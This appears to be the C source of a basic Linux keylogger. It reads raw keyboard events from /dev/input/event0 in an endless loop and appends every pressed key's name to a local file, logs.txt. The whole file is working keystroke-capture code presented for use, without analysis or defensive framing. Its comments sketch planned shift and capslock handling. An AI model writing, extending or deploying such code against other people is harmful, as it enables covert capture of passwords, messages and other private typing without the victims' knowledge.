#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<linux/input.h>
#include<string.h>
#include<fcntl.h>
#include<sys/ioctl.h>
#include<ctype.h>
#define KEY_RELEASE 0
#define KEY_IS_PRESSED 1
#define KEY_KEEPING_PRESSED 2

#include "parse.h"

/* 
 * Convert input stream key code to printable character and save to log file 
 */
static void print_code(int code) {
	struct parse_event *p;
	for (p = key_events; p->name != NULL; p++) {
		if (p->value == (unsigned) code) {
			char keycopy[40];
		
			// Handle special cases (spaces, enter, etc)		
			switch(p->value) {
				case 28: strcpy(keycopy, "\n");
					 break;
				case 57: strcpy(keycopy, " ");
					 break;
				default: strncpy(keycopy, &p->name[4], 40); // Chops off 'KEY_'
			}	

			// Open log file
			FILE *fp;
			fp = fopen("logs.txt", "a");
	
			if(fp == NULL) {
				exit(1);
			}

			// Save key to file
			fprintf(fp, "%s", keycopy);
			fclose(fp); // Close file
			
			return;
		}
	}
}

int main(int argc, char *argv[]) {

  	// Open keyboard file input stream
	char* keyboard = "/dev/input/event0"; // Todo: Handle /dev/input/eventX dynamically
	
	FILE* f = fopen(keyboard, "r");
	if (f == NULL) {
		perror("Keyboard input device not found");
		exit(1);
	}

	int fd;
	struct input_event evt[64]; // Keyboard input event, defined: https://www.kernel.org/doc/Documentation/input/input.txt

  	// Read in keyboard input
	if (( fd = open(keyboard, O_RDONLY)) < 0) {
		perror("Cannot read keyboard device input");
		return 1;
	}

 	// Create a listener to the input stream
	while (1) {

    		// Read byte stream from input event
		size_t readbyte = read(fd, evt, sizeof(evt));

   		// Check for incorrect reads
		if (readbyte < (int) sizeof(struct input_event)) {
			perror("Input too short to read");
			return 1;
		}

    		// Loop over the input event per byte size
		for(int i = 0; i < (int) (readbyte / sizeof(struct input_event)); i++) {
			if (EV_KEY == evt[i].type) {
        
				// Never print capslock or shift

				// Add a check to see if KEY_IS_PRESSED or KEY_KEEPING_PRESSED and key = SHIFT_KEY (probably need to check for left and right). 
				// Set a boolean variable for shift key to true
				// Set a boolean variable for caplocks key to true if it is pressed
				// XOR the value of capslock and shift to determine upper or lowercase
		
				// Essentially skips the events fired before and after a key press
        			// this way only the pressed key value is shown
				if ((evt[i].value == KEY_IS_PRESSED) || (evt[i].value == KEY_KEEPING_PRESSED)) {
					print_code(evt[i].code);
				}
			}
		}
	}
	return 0;
}
